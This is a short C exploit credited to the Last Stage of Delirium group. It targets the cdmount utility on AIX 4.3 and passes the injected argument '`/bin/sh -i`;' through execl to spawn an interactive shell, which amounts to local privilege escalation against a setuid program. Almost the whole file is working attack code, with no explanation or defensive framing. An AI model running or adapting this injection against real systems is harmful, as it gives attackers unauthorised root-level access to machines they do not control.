/*## copyright LAST STAGE OF DELIRIUM jun 2000 poland        *://lsd-pl.net/ #*/
/*## /usr/lpp/UMS/bin/cdmount                                                #*/

void main() {
    printf("copyright LAST STAGE OF DELIRIUM jun 2000 poland  //lsd-pl.net/\n");
    printf("/usr/lpp/UMS/bin/cdmount for aix 4.3 Powerpc/POWER\n\n");

    execl("/usr/lpp/UMS/bin/cdmount","lsd","1","`/bin/sh -i`;",0);
}

